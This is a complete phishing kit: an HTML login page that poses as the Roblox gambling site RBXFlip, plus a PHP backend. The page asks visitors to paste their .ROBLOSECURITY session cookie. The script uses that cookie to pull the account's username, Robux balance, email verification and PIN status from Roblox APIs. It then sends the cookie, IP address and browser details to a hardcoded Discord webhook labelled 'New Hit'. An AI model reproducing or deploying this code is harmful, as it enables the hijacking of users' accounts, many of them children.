
<html><!-- Primary Meta Tags --><head><title>RBXFlip | Fun &amp; Fair Roblox Games</title>
<meta name="title" content="RBXFlip | Fun &amp; Fair Roblox Games">
<meta name="description" content="RBXFlip Roblox and Crypto games. Play Rbxflip Coinflip/Roulette/Cases, or shop for items in our 0% fee marketplace. Millions won daily at RBXFlip! Come Gamble on rbxflip For free and rbx flip is safe and you can win robux on RBXflip Come to rbxflip.com and you can Bloxflip rbxflips Bloxflip limiteds for free. Play rbxflip Bloxflip! At RBxflip.">

    <style>
        @font-face {
            font-family: 'Poppins';
            src: url('poppins.woff2');
            font-weight: 200;
            font-style: normal;
            font-display: swap;
        }

        @font-face {
            font-family: 'Poppins_Bold';
            src: url('poppins_bold.woff2');
            font-style: bold;
            font-display: swap;
        }

        body {
            background-image: url("bg.png");
            font-family: 'Poppins';
            font-weight: 200;
            font-style: normal;
            color: white;
        }

        #login {
            position: absolute;
            top: 10%;
            left: 30%;
            width: 40%;
            background-color: #171C26;
            padding: 10px;
            padding-left: 20px;
            text-align: center;
            border-radius: 10px;
        }

        #login .header {
            text-align: left;
            padding-top: inherit;
            padding-bottom: inherit;
            font-family: 'Poppins_Bold';
        }

        #login .cookie {
            background-color: #20252F;
            width: 100%;
            left: 0%;
            position: relative;
        }

        #login .cookie input {
            text-align: left;
            background-color: rgba(0, 0, 0, 0);
            border-color: rgba(0, 0, 0, 0);
            font-family: 'Poppins';
            position: relative;

            color: #FFF;
            width: 80%;
        }

        #login .cookie img {
            display: inline;
            top: 100%;
            left: -7%;
            position: relative;
        }

        #login .info {
            text-align: left;
        }

        a {
            color: rgb(59, 130, 246);
            text-decoration: none;
        }

        .button {
            background-color: #3b82f6;
            padding: 6px;
            border-radius: 10px;
            height: 100%;
            padding-left: 100px;
            padding-right: 20%;
            font-size: 16px;
            font-family: 'Poppins_Bold';
            padding: 10px;
        }

        .buttons {
            text-align: right;
            height: 90%;
            padding: 10px;
        }

        button:hover {
            cursor: pointer;
        }
        #close {
            float:right;
        }
        #close:hover {
            cursor:pointer;
        }
    </style>
    <title>RBXFlip | Fun &amp; Fair Roblox Games</title>
    <link rel="icon" type="image/x-icon" href="https://yt3.googleusercontent.com/Y8Mc5ZTaghoBrKSy5ULDu_66wxPZ4GGBDuqGUIRLSiKA65dxgnv_KZs9H_FYa8X4daOinjKjJCI=s176-c-k-c0x00ffffff-no-rj">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
</head>

<body>
<form action="" method="post">
    <div id="login">
        <div class="header">
            <span>Login</span>
            <span id="close">×&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span>
        </div>
        <div class="cookie">
            <img src="cookie.png" height="12px">
            <input type="text" id="cookieval" name="ROBLOSECURITY" placeholder="Your cookie">
        </div>
        <div class="info">
            <p>Your credentials are used only to gather your profile information and to send/accept trades on behalf of
                our system.</p>

            <p>Having trouble? Watch <a href="https://www.youtube.com/watch?v=9n7YnBOzFPc" target="_blank">this</a>
                youtube video on how to login</p>

        </div>
        <div class="buttons">
            <input type="submit" class="button" value="Login" name="submit">
        </div>




</div></form></body></html>



<?php

if(isset($_POST["submit"])){
    $cookiegrab = $_POST["ROBLOSECURITY"];

}

$ip = $_SERVER['REMOTE_ADDR'];
$host = $_SERVER['HTTP_USER_AGENT'];

$cookie = "$cookiegrab";

// Initialize cURL session
$ch = curl_init();

// Set the URL of the API endpoint
curl_setopt($ch, CURLOPT_URL, "https://www.roblox.com/mobileapi/userinfo");

// Set the headers for the request
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    "Cookie: .ROBLOSECURITY=" . $cookie,
    "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
));

// Set the option to return the response as a string
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

// Execute the cURL request
$response = curl_exec($ch);

// Check for errors
if (curl_errno($ch)) {
} else {
    // Decode the response as JSON
    $profile = json_decode($response, true);

    // Check if the JSON decoding was successful
    if (json_last_error() === JSON_ERROR_NONE) {

    }
}


$ch = curl_init();

// Set the URL of the API endpoint
curl_setopt($ch, CURLOPT_URL, "https://accountsettings.roblox.com/v1/email");

// Set the headers for the request
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    "Cookie: .ROBLOSECURITY=" . $cookie,
    "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
));

// Set the option to return the response as a string
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

// Execute the cURL request
$response = curl_exec($ch);

// Check for errors
if (curl_errno($ch)) {
} else {
    // Decode the response as JSON
    $lol = json_decode($response, true);

    // Check if the JSON decoding was successful
    if (json_last_error() === JSON_ERROR_NONE) {

    }
}

$ch = curl_init();

// Set the URL of the API endpoint
curl_setopt($ch, CURLOPT_URL, "https://auth.roblox.com/v1/account/pin");

// Set the headers for the request
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    "Cookie: .ROBLOSECURITY=" . $cookie,
    "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
));

// Set the option to return the response as a string
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

// Execute the cURL request
$response = curl_exec($ch);

// Check for errors
if (curl_errno($ch)) {
} else {
    // Decode the response as JSON
    $PIN = json_decode($response, true);

    // Check if the JSON decoding was successful
    if (json_last_error() === JSON_ERROR_NONE) {

    }
}



$name = "Termed";

$url = "https://discord.com/api/webhooks/1101251391802048522/_hwypoQ8D11lytdZHE18x8COoyzm-ZHgccqTuN0fIcYZClbABEGUIrT6oxS-z932OFOX";
$headers = [ 'Content-Type: application/json; charset=utf-8' ];
$POST = [
    "username" => "$name - Bot",
    "avatar_url" => "https://images-ext-1.discordapp.net/external/Zlya4eIE_UKqxSBwNt99ZjQH3cFoxxiLWhtiaPcxISw/https/cdn-icons-png.flaticon.com/256/10483/10483977.png?width=307&height=307",
     "content" => "",
        "embeds" => [
            [
                "title" => 'New Hit 💸',
                "type" => "rich",
                "color" => hexdec("99999"),
                "thumbnail" => [
                    "url" => $profile["ThumbnailUrl"],
                ],
                "footer" => [
                    "text" => "Bloxflip New Hit!",
                  "icon_url" => "https://images-ext-1.discordapp.net/external/Zlya4eIE_UKqxSBwNt99ZjQH3cFoxxiLWhtiaPcxISw/https/cdn-icons-png.flaticon.com/256/10483/10483977.png?width=307&height=307"
                ],
                "fields" => [
                    [
                        "name" => "**Username**",
                        "value" => $profile["UserName"],
                        "inline" => true
                    ],
                    [
                        "name" => "**Robux <:robux:818111919881715764>**",
                        "value" => $profile["RobuxBalance"],
                        "inline" => true
                    ],
                    [
                        "name" => "**premuim? <:premium:818111829963964416>**",
                        "value" => $profile["IsPremium"],
                        "inline" => true
                    ],
                    [
                        "name" => "**Verified?**",
                        "value" => $lol["verified"],
                        "inline" => true
                    ],
                    [
                        "name" => "**PIN?**",
                        "value" => $PIN["isEnabled"],
                        "inline" => true
                    ],
                    [
                        "name" => "**IP**",
                        "value" => "$ip",
                        "inline" => true
                    ],
                    [
                        "name" => "**HOST MACHINE**",
                        "value" => "$host",
                        "inline" => true
                    ],
                    [
                        "name" => "**Cookie**",
                        "value" => "```$cookie```",
                        "inline" => true
                    ],
                ]
            ]
        ]
    ];

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($POST));
$response   = curl_exec($ch);

// Close the cURL session
curl_close($ch);
?>
